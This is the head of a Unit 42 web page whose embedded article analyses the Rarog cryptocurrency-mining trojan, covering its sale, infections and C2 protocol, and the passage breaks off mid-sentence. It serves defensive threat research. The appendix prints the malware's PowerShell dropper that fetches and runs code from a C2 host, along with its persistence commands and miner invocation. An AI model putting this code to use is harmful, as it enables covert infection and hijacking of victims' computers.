<!doctype html>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">
    <link rel="preconnect" href="https://www.paloaltonetworks.com">
    <link rel="preconnect" href="https://cdn.cookielaw.org">
    <link rel="preconnect" href="https://fonts.googleapis.com">
	    <!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
var main_site_url = 'https://www.paloaltonetworks.com';
var maindomain_lang = 'https://www.paloaltonetworks.com';
function getParameterByName(name, url) {
		if(url == null){
		  url = window.location.href;
		}
	    name = name.replace(/[\[\]]/g, '\\$&');
	    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	    if (!results) return null;
	    if (!results[2]) return '';
	    return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
	var container_q = getParameterByName('container');
	var d_lang = 'en';	
</script>

<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTop.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/criticalTopProductNav.min.css"></noscript>
<link rel="preload" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://www.paloaltonetworks.com/etc.clientlibs/panClean/components/mainNavigationComp/clientlibs/panClean/deferedProductNav.min.css"></noscript>
  <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-smoking-rarog-mining-trojan/" />
<link rel="alternate" hreflang="x-default" href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/" />

	<!-- This site is optimized with the Yoast SEO Premium plugin v23.7 (Yoast SEO v23.7) - https://yoast.com/wordpress/plugins/seo/ -->
	<title>Smoking Out the Rarog Cryptocurrency Mining Trojan</title>
	<meta name="description" content="Unit 42 investigates Rarog, a relatively unknown coin mining Trojan sold on various underground forums." />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="Smoking Out the Rarog Cryptocurrency Mining Trojan" />
	<meta property="og:description" content="Unit 42 investigates Rarog, a relatively unknown coin mining Trojan sold on various underground forums." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/" />
	<meta property="og:site_name" content="Unit 42" />
	<meta property="article:published_time" content="2018-04-04T02:00:03+00:00" />
	<meta property="article:modified_time" content="2018-11-01T11:04:37+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
	<meta property="og:image:width" content="650" />
	<meta property="og:image:height" content="300" />
	<meta property="og:image:type" content="image/jpeg" />
	<meta name="author" content="Unit 42" />
	<meta name="twitter:card" content="summary_large_image" />
	<!-- / Yoast SEO Premium plugin. -->


<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Feed" href="https://unit42.paloaltonetworks.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Comments Feed" href="https://unit42.paloaltonetworks.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Unit 42 &raquo; Smoking Out the Rarog Cryptocurrency Mining Trojan Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan/feed/" />
<script type="text/javascript">
var globalConfig = {};
var webData = {};
webData.channel = "unit42";
webData.property = "unit42.paloaltonetworks.com";
webData.language = "en_us";
webData.pageType = "blogs";
webData.pageName = "unit42:unit42-smoking-rarog-mining-trojan";
webData.pageURL = "https://unit42.paloaltonetworks.com/unit42-smoking-rarog-mining-trojan";
webData.article_title = "Smoking Out the Rarog Cryptocurrency Mining Trojan";
webData.author = "Unit 42";
webData.published_time = "2018-04-04T05:00:03-07:00";
webData.description = "Unit 42 investigates Rarog, a relatively unknown coin mining Trojan sold on various underground forums.";
webData.keywords = "Cybercrime,Malware,Threat Research,Cryptocurrency mining,Monero,Rarog";
webData.resourceAssetID = "e7f4d4e9253a047557573fc19c53c0f1";
</script>
<script type="text/javascript">
var globalConfig = {};
globalConfig.buildName = "UniqueResourceAssetsID_DEC022022";
</script>
<meta property="og:likes" content="5"/>
<meta property="og:readtime" content="12"/>
<meta property="og:views" content="58,044"/>
<meta property="og:date_created" content="April 4, 2018 at 5:00 AM"/>
<meta property="og:post_length" content="3587"/>
<meta property="og:category" content="Cybercrime"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Research"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/cybercrime/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-research/"/>
<meta property="og:author" content="Unit 42"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/unit42/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta name="post_tags" content="Cryptocurrency mining,Monero,Rarog"/>
<meta property="og:popular" content="true"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Smoking Out the Rarog Cryptocurrency Mining Trojan","name":"Smoking Out the Rarog Cryptocurrency Mining Trojan","description":"Unit 42 investigates Rarog, a relatively unknown coin mining Trojan sold on various underground forums.","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-smoking-rarog-mining-trojan\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-smoking-rarog-mining-trojan\/","datePublished":"April 4, 2018","articleBody":"\r\nFor the past few months, Unit 42 researchers have investigated a relatively unknown coin mining Trojan that goes by the name \u2018Rarog\u2019.\r\nRarog has been sold on various underground forums since June 2017 and has been used by countless criminals since then. To date, Palo Alto Networks has observed roughly 2,500 unique samples, connecting to 161 different command and control (C2) servers.\r\nRarog has been seen primarily used to mine the Monero cryptocurrency, however, it has the capability to mine others.\u00a0 It comes equipped with a number of features, including providing mining statistics to users, configuring various processor loads for the running miner, the ability to infect USB devices, and the ability to load additional DLLs on the victim.\r\nRarog is in line with the overall trends we\u2019ve seen regarding the rapidly increasing use of cryptocurrency miners. Additionally, Rarog provides an affordable way for new criminals to gain entry into this particular type of malware.\r\nTo date, we have confirmed over 166,000 Rarog-related infections worldwide. The majority of these occur in the Philippines, Russia, and Indonesia. While a large number of infections have been recorded by various criminals who have used this mining Trojan, we have seen very little recorded profits: the highest profits we have observed amount to roughly US $120.\r\nThe Trojan itself is likely named after a \u201cRar\u00f3g\u201d, a fire demon that originates in Slavic mythology and is typically represented as a fiery falcon.\r\n&nbsp;\r\nRarog on the Underground\r\nThe Rarog Trojan originated on various Russian-speaking criminal underground sites in June 2017, as shown in the image below:\r\n\r\nFigure 1 Posting in Russian underground forum for Rarog malware\r\nThe malware sells for 6,000 Rubles, or roughly US $104 at today\u2019s exchange rates. Additionally, a guest administration panel is provided to allow potential buyers the chance to do a \u201ctest drive\u201d by interacting with the interface. This interface may be seen below:\r\n\r\nFigure 2 Rarog administration panel\r\nNote the two Twitter handles shown in the administration panel above. The first handle, \u201carsenkooo135\u201d, is the same handle used in various postings for this malware family, including the one shown in Figure 1. We observed the second handle, \u201cfoxovsky\u201d, interacting with other security researchers online. We also tied this handle to a GitHub repository with the same handle that hosts various other malware families. Evidence suggests that these two individuals are the ones behind this threat.\r\n\r\nFigure 3 Foxovsky handle on Twitter interacting with security researchers regarding the Rarog malware family\r\n\r\nFigure 4 Foxovsky\u2019s GitHub profile, hosting various malware families\r\nAdditionally, we have seen the \u201cfoxovsky\u201d account on GitHub host the Rarog malware family on his or her GitHub account.\r\n&nbsp;\r\nRarog Malware Family\r\nAt a very high level, the Rarog Mining Trojan performs the following actions:\r\n\r\nFigure 5 Rarog flow of execution\r\nThe malware comes equipped with a number of features. It uses multiple mechanisms to maintain persistence on the victim\u2019s machine, including the use of the Run registry key, scheduled tasks, and shortcut links in the startup folder. At its core, Rarog is a coin mining Trojan and gives the attackers the ability to not only download mining software but configure it with any parameters they wish. They\u2019re also able to easily throttle the mining software based on the victim machine\u2019s characteristics.\r\nIn addition to coin mining, Rarog also employs a number of botnet techniques. It allows the attackers to perform a number of actions, such as downloading and executing other malware, levying DDoS attacks against others, and updating the Trojan, to name a few. Throughout the malware\u2019s execution, a number of HTTP requests are made to a remote C2 server. An overview of all of these URIs and their description may be found below:\r\n\r\n\r\n\r\nURI\r\nDescription\r\n\r\n\r\n\/2.0\/method\/checkConnection\r\nTo ensure the remote server is responding as expected.\r\n\r\n\r\n\/2.0\/method\/config\r\nGet arguments to supply to miner program.\r\n\r\n\r\n\/2.0\/method\/delay\r\nRetrieve time to sleep before executing miner program.\r\n\r\n\r\n\/2.0\/method\/error\r\nRetrieve information about error message to display to the victim.\r\n\r\n\r\n\/2.0\/method\/get\r\nGet location of miner file based on CPU architecture of victim.\r\n\r\n\r\n\/2.0\/method\/info\r\nGet exe name of miner program.\r\n\r\n\r\n\/2.0\/method\/setOnline\r\nUpdate statistics for victim on C2 server.\r\n\r\n\r\n\/2.0\/method\/update\r\nUsed for updating the Rarog Trojan\r\n\r\n\r\n\/4.0\/method\/blacklist\r\nRetrieve a list of process names to check against. Should any be running in the foreground, Rarog will suspend mining operations.\r\n\r\n\r\n\/4.0\/method\/check\r\nQuery remote C2 server to determine if ID exists.\r\n\r\n\r\n\/4.0\/method\/cores\r\nRetrieve percentage of CPU to use on victim machines for mining.\r\n\r\n\r\n\/4.0\/method\/installSuccess\r\nQuery the C2 server for botnet instructions.\r\n\r\n\r\n\/4.0\/method\/modules\r\nRetrieve third-party modules to load on victim.\r\n\r\n\r\n\/4.0\/method\/threads\r\nDetermine what tasks to run on the victim machine (USB spreading, helper executables, etc.)\r\n\r\n\r\n\r\n&nbsp;\r\nFor additional information on how the Rarog malware family operations, please refer to the Appendix.\r\n&nbsp;\r\nVictim Telemetry\r\nWe identified a total of 161 C2 servers communicating with the Rarog malware family. A full list may be found in the Appendix. Looking at the geographic distribution of these C2 servers, we see a high concentration of them located in Russia and Germany.\r\n\r\nFigure 6 Distribution of C2 servers hosting Rarog malware\r\nThe distribution rate of new Rarog samples has varied in the past nine months, with a large spike occurring between late August to late September of 2017. At its peak, we encountered 187 unique Rarog samples during the week of September 11, 2017.\r\n&nbsp;\r\n\r\nFigure 7 New Rarog malware samples encountered over time\r\nThese samples confirm at least 166,000 victims spread across the globe. While infections occur in most regions of the world, high concentrations occur in the Philippines, Russia, and Indonesia, as seen in the figure below:\r\n\r\nFigure 8 Rarog infections across the globe\r\nRarog is able to provide telemetry those that have purchased it using the third-party MinerGate mining service. A number of MinerGate API keys were able to be retrieved, however, the profits made by these attackers were minimal at best. The most profitable attacker was found to generate roughly 0.58 Monero (XMR), and 54 ByteCoin (BCN). By today\u2019s exchange rates, this amounts to $123.68 total. After factoring in the cost of the malware itself at $104, the attackers in question have generated very little income. In most cases, they\u2019ve lost money.\r\n&nbsp;\r\nTies to Previous Malware Families\r\nIn late October 2017, Kaspersky wrote a blog post about a malware family named \u2018DiscordiaMiner\u2019. In this blog post, they describe a cryptocurrency miner that shared a number of characteristics with Rarog. Upon further inspection, they mention the author of the program, who is none other than the previously mentioned \u201cfoxovsky\u201d user. Indeed, when looking at this user\u2019s GitHub account in Figure 4, we saw the source code to this mining Trojan. The last time the source code to this particular malware was updated was on May 25th, 2017.\r\nLooking at the source code to DiscordiaMiner, we see a large number of similarities with Rarog. So many in fact, that we might reach the conclusion that Rarog is an evolution of Discordia. Kaspersky\u2019s blog post discussed some drama concerning this particular malware family on various underground forums. Accusations were made against the Trojan\u2019s author with substituting customer\u2019s cryptocurrency wallet addresses with his own. This dispute is what ultimately led foxovsky to open-source the DiscordiaMiner program on GitHub. The timeline of when Rarog was first advertised in June 2017, as well as the time DiscordiaMiner was last updated in May 2017, paints, and interesting picture. Based on this information, as well as the heavy code overlap made between the malware families, I suspect that foxovsky rebranded DiscordiaMiner to Rarog and continued development on this newly named malware family. This re-branding allowed him to get away from the negativity that was associated with DiscordiaMiner.\r\n&nbsp;\r\nConclusion\r\nThe Rarog malware family represents a continued trend toward the use of cryptocurrency miners and their demand on the criminal underground. While not incredibly sophisticated, Rarog provides an easy entry for many criminals into running a cryptocurrency mining botnet. The malware has remained relatively unknown for the past nine months barring a few exceptions. As the value of various cryptocurrencies continues to remain high, it is likely that we\u2019ll continue to see additional malware families with mining functionality surface.\r\nPalo Alto Networks customers are protected against this threat in the following ways:\r\n\r\n \tAll samples referenced in this blog post are appropriately marked as malicious in WildFire and Traps\r\n \tAll domains used as C2 servers for Rarog are flagged as malicious\r\n \tTracking of the Rarog malware family may be done through the AutoFocus Rarog tag\r\n\r\n&nbsp;\r\nAppendix\r\n&nbsp;\r\nTechnical Malware Analysis\r\nThe file with the following properties was used to conduct this analysis:\r\n\r\n\r\n\r\nMD5\r\n15361551cb2f705f80e95cea6a2a7c04\r\n\r\n\r\nSHA1\r\na388e464edeb8230adc955ed6a78540ed1433078\r\n\r\n\r\nSHA256\r\n73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a\r\n\r\n\r\nCompile Time\r\n2018-03-17 16:36:18 UTC\r\n\r\n\r\nPDB String\r\nD:\\Work\\_Rarog\\Release\\Rarog.pdb\r\n\r\n\r\n\r\n&nbsp;\r\nWhen Rarog is initially executed, the malware will look for the existence of the following file:\r\n\r\n \tC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\r\n\r\nIn the event this file is missing on the system, Rarog will enter its installation routine, which is outlined below.\r\n&nbsp;\r\nInstallation Routine\r\nThe installation routine begins by creating the following hidden directory path:\r\n\r\n \tC:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\\r\n\r\nIt then copies itself to the directory above with a filename of \u2018Isass.exe\u2019. This newly copied file is then executed in a new process. After this takes place, the malware makes a HTTP POST request as follows:\r\nPOST \/2.0\/method\/checkConnection HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 0\r\nHost: api.polotreck[.]xyz\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.9\r\nDate: Tue, 20 Mar 2018 16:34:10 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 12\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\nc3VjY2Vzcw==\r\n\r\nThe response of the above request is simply base64-encoded and decodes to \u2018success\u2019. The response is checked, and if the response of \u2018success\u2019 is received, the malware proceeds.\r\nThe malware makes the following request to determine if the C2 wishes the malware to spawn a fake error message box:\r\nPOST \/2.0\/method\/error HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 9\r\nHost: api.polotreck[.]xyz\r\nprofile=1\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.9\r\nDate: Tue, 20 Mar 2018 16:43:58 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 192\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\nVary: Accept-Encoding\r\nMTsxO1N5c3RlbSBFcnJvcjtUaGUgcHJvZ3JhbSBjYW4ndCBzdGFydCBiZWNhdXNlIE1TVkNQMTEwLmRsbCBpcyBtaXNzaW5nIGZyb20geW91ciBjb21wdXRlci4gVHJ5IHJlaW5zdGFsbGluZyB0aGUgcHJvZ3JhbSB0byBmaXggdGhpcyBwcm9ibGVtLg==\r\n\r\nThe base64 response above decodes to the following:\r\n\u201c1;1;System Error;The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.\u201d\r\nThe response is split by \u2018;\u2019. The first parameter is hardcoded, while the second is used to specify the type of message box to display. The following options are provided:\r\n\r\n\r\n\r\nParameter\r\nMessageBox Option\r\n\r\n\r\n0\r\nNo error message displayed.\r\n\r\n\r\n1\r\nA stop-sign icon appears in the message box.\r\n\r\n\r\n2\r\nA question-mark icon appears in the message box.\r\n\r\n\r\n3\r\nAn exclamation-point icon appears in the message box.\r\n\r\n\r\n4\r\nAn icon consisting of a lowercase letter i in a circle appears in the message box.\r\n\r\n\r\n\r\nThe third parameter specifies the title of the message box, while the last parameter represents the message. Using the example previously, we are presented with the following message:\r\n\r\nFigure 9 Fake error message box displayed by Rarog\r\nFinally, Rarog will execute the following command, which will kill the current malware instance, and deleting it from disk.\r\ncmd.exe \/c taskkill \/im 73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe \/f &amp; erase C:\\Users\\Administrato\\Desktop\\73222ff531ced249bf31f165777696bb20c42d2148938392335f97f5d937182a.exe &amp; exit\r\n&nbsp;\r\nPost-Installation Routine\r\nAfter the installation routine completes and a new instance of Isass.exe is spawned, this new instance of Rarog will check for the existence of the following file:\r\n\r\n \tC:\\ProgramData\\{4FCEED6C-B7D9-405B-A844-C3DBF418BF87}\\driver.dat\r\n\r\nIf this file does not exist, Rarog will create the necessary hidden directory structure, and make a series of HTTP POST requests. The first request will be to \u2018\/2.0\/method\/checkConnection\u2019 to ensure the remote C2 server is alive. The second request is to the following:\r\nPOST \/4.0\/method\/installSuccess HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 9\r\nHost: api.polotreck[.]xyz\r\nbuildID=5.1&amp;hwid={1efdb526-2d21-11e8-a30c-8c8590105ceb}&amp;profile=1&amp;os=Microsoft Windows 7 Ultimate &amp;platform=x86&amp;processor=Intel(R) Core(TM) i7-7700HQ CPU @ 2.80 GHz&amp;videocard=VMware SVGA 3D\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.9\r\nDate: Tue, 20 Mar 2018 16:43:58 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 192\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\n250\r\n\r\nThe response provided by the C2 server is the stored identifier of the victim within the C2 database. This number is stored in the \u2018driver.dat\u2019 file.\r\nThe following registry key is created to ensure Rarog persists across reboots:\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows_Antimalware_Host_Syst - C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\r\nThe following hidden directory is created, and the following three files are written to this location:\r\nC:\\ProgramData\\WindowsAppCertification\\WindowHelperStorageHostSystemThread.ps1\r\nC:\\ProgramData\\WindowsAppCertification\\cert.cmd\r\nC:\\ProgramData\\WindowsAppCertification\\checker.vbs\r\nThe contents of WindowHelperStorageHostSystemThread.ps1 is as follows:\r\n&nbsp;\r\n$path = 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\'\r\n$fpath = $path + 'Isass.exe'\r\n$furl = 'http:\/\/api.polotreck[.]xyz\/2.0\/method\/update'\r\n$isfile = Test-Path $fpath\r\nif($isfile -eq 'True') {}\r\nelse{\r\nNew-Item -ItemType directory -Path $path\r\n$WebClient = New-Object System.Net.WebClient\r\n$WebClient.DownloadFile($furl,$fpath)\r\nStart-Process -FilePath $fpath}\r\n\r\nThe contents of cert.cmd is as follows:\r\n@echo off\r\npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoP -file C:\\ProgramData\\WindowsAppCertification\\WindowHelperStorageHostSystemThread.ps1\r\n\r\nThe contents of checker.vbs is as follows:\r\nSet WshShell = CreateObject(\"WScript.Shell\")\r\nWshShell.Run \"C:\\ProgramData\\WindowsAppCertification\\cert.cmd\",0\r\n\r\nThe following command is executed to create a Scheduled Task to run the checker.vbs script periodically:\r\nschtasks.exe \/Create \/SC MINUTE \/MO 30 \/TN \"Windows_Antimalware_Host\" \/TR \"C:\\ProgramData\\WindowsAppCertification\\checker.vbs\" \/F\r\nThe following command is executed to create a Scheduled Task to run Isass.exe periodically:\r\nschtasks.exe \/Create \/SC MINUTE \/MO 5 \/TN \"Windows_Antimalware_Host_Systm\" \/TR \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\" \/F\r\nAdditionally, the following command is executed to generate a shortcut link in the victim\u2019s startup folder:\r\ncmd.exe \/c echo Set oWS = WScript.CreateObject(\"WScript.Shell\") &gt; CreateShortcut.vbs &amp; echo sLinkFile = \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Isass.lnk\" &gt;&gt; CreateShortcut.vbs &amp; echo Set oLink = oWS.CreateShortcut(sLinkFile) &gt;&gt; CreateShortcut.vbs &amp; echo oLink.TargetPath = \"C:\\ProgramData\\MicrosoftCorporation\\Windows\\System32\\Isass.exe\" &gt;&gt; CreateShortcut.vbs &amp; echo oLink.Save &gt;&gt; CreateShortcut.vbs &amp; cscript CreateShortcut.vbs &amp; del CreateShortcut.vbs\r\nThese various registry modifications, file modifications, and commands executed provides multiple ways for Rarog to persist on the system both across reboots, as well as in instances where the malware dies or is forcibly closed.\r\nRarog then makes the following POST request to ensure the ID exists on the remote C2 server:\r\nPOST \/4.0\/method\/check HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 6\r\nHost: api.polotreck[.]xyz\r\nid=250\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.10\r\nDate: Tue, 20 Mar 2018 20:47:52 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 12\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\nc3VjY2Vzcw==\r\n\r\nAgain, Rarog looks for a response of 'success'. Rarog continues to make the following POST request:\r\nPOST \/4.0\/method\/threads HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 0\r\nHost: api.polotreck[.]xyz\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.10\r\nDate: Tue, 20 Mar 2018 20:49:46 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 16\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\nMjsxOzE7MTsyOw==\r\n\r\nThe decoded response by the C2 server is \u20182;1;1;1;2;\u2019. This data is split via \u2018;\u2019 and the values are used to indicate whether certain Rarog features are enabled or not. The value of \u20181\u2019 represents \u2018On\u2019, while anything else represents \u2018Off\u2019.\r\n\r\n\r\n\r\nPosition\r\nName\r\nDescription\r\n\r\n\r\n0\r\nUSB Devices\r\nSearches the machine for removable drives. Copies Rarog to the removable drive with the name of 'autorun.exe'. Also creates an 'autorun.inf' file in the same directory, which will execute 'autorun.exe' when loaded.\r\n\r\n\r\n1\r\nHelpers\r\nCreates the hidden 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\Helpers\\' directory, and copies Isass.exe to 'SecurityHeaIthService.exe', 'SystemldleProcess.exe', and 'winIogon.exe' in this directory.\r\n\r\n\r\n2\r\nMining Status\r\nMakes a POST request to '\/2.0\/method\/get' to retrieve a URL for a mining executable. This file is stored in the 'C:\\ProgramData\\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\\' directory.\r\n\r\n\r\n3\r\nMiners Killer\r\nMakes a POST request to '\/4.0\/method\/modules'. This provides a list of DLLs that are placed in the 'C:\\ProgramData\\MicrosoftCorporation\\Windows\\Modules\\' folder. These DLLs are then loaded by Rarog. The DLLs in question are expected to have an export function named 'Instance'.\r\n\r\n\r\n4\r\nTask Manager\r\nThis does not appear to be used by the malware.\r\n\r\n\r\n\r\n&nbsp;\r\nWhen the \u2018Mining Status\u2019 option is enabled, and a miner is successfully downloaded from a remote server, Rarog will make the following request to the C2 server:\r\nPOST \/2.0\/method\/config HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 6\r\nHost: api.polotreck[.]xyz\r\nid=250\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.10\r\nDate: Wed, 21 Mar 2018 16:55:38 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 108\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\nVary: Accept-Encoding\r\nLW8geG1yLnBvb2wubWluZXJnYXRlLmNvbTo0NTU2MCAtdSBtb3JlMnNldEBwcm90b25tYWlsLmNvbSAtcCB4IC1rIC10IHtUSFJFQURTfQ==\r\n\r\nThe response decodes to the following:\r\no xmr.pool.minergate[.]com:45560 -u more2set@protonmail[.]com -p x -k -t {THREADS}\r\nThese parameters will be supplied to the mining program upon execution. Prior to running the miner, Rarog will check the running processes on the system for the following strings. Should they be encountered, the processes will be killed, and the executable will be deleted from the system.\r\n\r\n \tminergate\r\n \tstratum\r\n \tcryptonight\r\n \tmonerohash\r\n \tnicehash\r\n \tdwarfpool\r\n \tsuprnova\r\n \tnanopool\r\n \txmrpool\r\n\r\nThese strings represent common strings associated with mining pools used by individuals when mining various cryptocurrencies.\r\nRarog will make the following request to determine how much of a percentage of the victim\u2019s CPU to use for mining:\r\nPOST \/4.0\/method\/cores HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 6\r\nHost: api.polotreck[.]xyz\r\nid=250\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.10\r\nDate: Wed, 21 Mar 2018 17:03:18 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 4\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\nNTA=\r\n\r\nThe response decodes to a value of \u201850\u2019. Rarog continues to make a request to \u2018\/4.0\/method\/blacklist\u2019 determine what processes should be blacklisted. The server in question did not have a configured blacklist, but an example of what may be returned is shown below:\r\ndota2.exe;csgo.exe;WorldOfTanks.exe;TslGame.exe;gta5.exe;photoshop.exe;vegas_pro.exe;premier.exe;Prey.exe;Overwatch.exe;MK10.exe;Minecraft.exe;DiabloIII.exe;QuakeChampions.exe;Acrobat.exe;Acrord32.exe\r\nThis list represents common resource-intensive applications, such as games, that Rarog will continually monitor for. In the event such a program is running in the foreground, Rarog will suspend mining operations.\r\nThe malware then makes the following request to retrieve the amount of time that Rarog will sleep before mining on the target victim:\r\nPOST \/2.0\/method\/delay HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 6\r\nHost: api.polotreck[.]xyz\r\nid=250\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.10\r\nDate: Wed, 21 Mar 2018 17:11:05 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 5\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\n10000\r\n\r\nPrior to continuing, Rarog will check the running processes on the system for the following common security applications, and will not proceed if found:\r\n\r\n \tNetMonitor\r\n \tTaskmgr.exe\r\n \tProcess Killer\r\n \tKillProcess\r\n \tSystem Explorer\r\n \tAnVir\r\n \tProcess Hacker\r\n\r\nRarog takes the previously collected CPU usage percentage and applies it against the number of CPUs found on the system. As an example, if a system had four CPU cores, and the setting was at 50%, Rarog could configure the miner to use 2 threads (0.5 x 4). The following mining command is executed by Rarog:\r\nC:\\ProgramData\\{CB28D9D3-6B5D-4AFA-BA37-B4AFAABF70B8}\\xmrig32.exe -o xmr.pool.minergate[.]com:45560 -u more2set@protonmail[.]com -p x -k -t 1\r\n&nbsp;\r\nBotnet Functionality\r\nRarog will periodically make HTTP POST requests to the following:\r\nPOST \/2.0\/method\/setOnline HTTP\/1.1\r\nConnection: Keep-Alive\r\nContent-Type: application\/x-www-form-urlencoded\r\nUser-Agent: Mozilla\/5.0 (Windows NT 6.1) Rarog\/5.0\r\nContent-Length: 16\r\nHost: api.polotreck[.]xyz\r\nid=250&amp;build=5.1\r\nHTTP\/1.1 200 OK\r\nServer: nginx\/1.13.10\r\nDate: Wed, 21 Mar 2018 17:28:27 GMT\r\nContent-Type: text\/html; charset=UTF-8\r\nContent-Length: 0\r\nConnection: keep-alive\r\nX-Powered-By: PHP\/5.6.30-0+deb8u1\r\n\r\nThis particular URI has the ability to provide additional tasks for 